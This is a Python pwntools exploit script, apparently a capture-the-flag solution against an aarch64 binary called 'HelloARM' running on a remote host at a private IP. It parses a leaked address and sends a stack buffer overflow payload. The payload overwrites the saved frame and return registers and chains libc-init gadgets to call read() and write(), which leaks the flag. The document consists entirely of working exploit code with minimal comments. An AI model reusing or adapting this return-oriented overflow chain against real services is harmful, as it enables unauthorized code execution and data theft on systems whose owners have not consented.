from pwn import *
import sys
context.log_level='debug'
context.arch='aarch64'
Debug = True

elf=ELF('./HelloARM', checksec = False)

libc=ELF("./lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    return remote('10.104.255.210', 7777)
    # global libc
    # if args['REMOTE']:
    #     if other_libc is not null:
    #         libc = ELF("./", checksec = False)
    #     return remote('10.104.255.210', 7777)
    # elif Debug:
    #     sh = process(["qemu-aarch64", "-g", "2333", "-L", "./", "./HelloARM"])
    #     log.info('Please use GDB remote!(Enter to continue)')
    #     raw_input()
    #     return sh
    # else :
    #     return process(["qemu-aarch64", "-L", "./", "./HelloARM"])


conn = get_sh()
conn.recvline()
bb = conn.recvline()
hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)

guess_fd = 3
flag_len = 0x20*8 - 8

conn.recv()
conn.send('imlk____________')
conn.recv()
payload = ('a' * 0x100).encode() # 填充

payload += p64(addr_magic - 0x10) # x29
payload += p64(0x0000000000400AD0) # x30 for ret to __libc
for i in range(0, 0x32):
    if i == 0x0: 
        payload += p64(0x0000000000400730) # set to write func pointer
    elif i == 0x1: # addr_magic-0x08 for w
        payload += p64(0x0000000000400760) # set to read func pointer
    elif i == 0x2: # addr_magic
        payload += p64(0) # addr_magic-0x28 for x19


    elif i == 0x22:# x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x23:# x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x25: # x20
        payload += p64(1) # to compare with x19, mark read() finished
    elif i == 0x26: # x21
        payload += p64(addr_magic - 0x8)
    elif i == 0x27: # x22
        payload += p64(guess_fd)
    elif i == 0x28: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x29: # x24
        payload += p64(flag_len)


    elif i == 0x2a: # x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x2b: # x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x2d: # x20
        payload += p64(1) # to compare with x19, mark write() finished
    elif i == 0x2e: # x21
        payload += p64(addr_magic - 0x10)
    elif i == 0x2f: # x22
        payload += p64(1)
    elif i == 0x30: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x31: # x24
        payload += p64(flag_len)

    else:
        payload += p64(i)


conn.send(payload)

while True:
    conn.recv()


